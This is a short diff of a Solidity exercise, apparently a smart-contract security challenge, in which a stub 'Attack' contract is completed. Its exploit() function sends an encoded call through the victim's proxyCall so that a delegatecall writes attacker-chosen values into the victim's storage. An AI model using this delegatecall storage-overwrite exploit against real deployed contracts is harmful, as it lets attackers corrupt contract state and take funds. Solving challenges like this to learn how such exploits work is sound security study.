@@ -8,18 +8,18 @@ interface ID31eg4t3 {
 
 contract Attack {
     address internal immutable victim;
-    // TODO: Declare some variable here
-    // Note: Checkout the storage layout in victim contract
+    bool public result;
 
     constructor(address addr) payable {
         victim = addr;
     }
 
-    // NOTE: You might need some malicious function here
+    function changeResult() external {
+        result = true;
+    }
 
     function exploit() external {
-        // TODO: Add your implementation here
-        // Note: Make sure you know how delegatecall works
-        // bytes memory data = ...
+        bytes memory data = abi.encodeWithSelector(ID31eg4t3.changeResult.selector, "");
+        ID31eg4t3(victim).proxyCall(data);
     }
 }
